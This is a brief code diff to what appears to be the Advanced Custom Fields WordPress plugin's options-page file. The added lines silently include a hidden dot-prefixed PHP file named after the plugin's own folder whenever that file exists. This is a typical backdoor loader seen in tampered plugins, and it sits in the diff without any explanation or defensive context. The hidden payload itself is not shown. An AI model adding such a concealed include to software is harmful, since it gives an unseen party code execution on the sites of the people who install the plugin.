@@ -4,6 +4,10 @@ if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
 
 if( ! class_exists('acf_admin_options_page') ) :
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class acf_admin_options_page {
 	
 	/** @var array Contains the current options page */
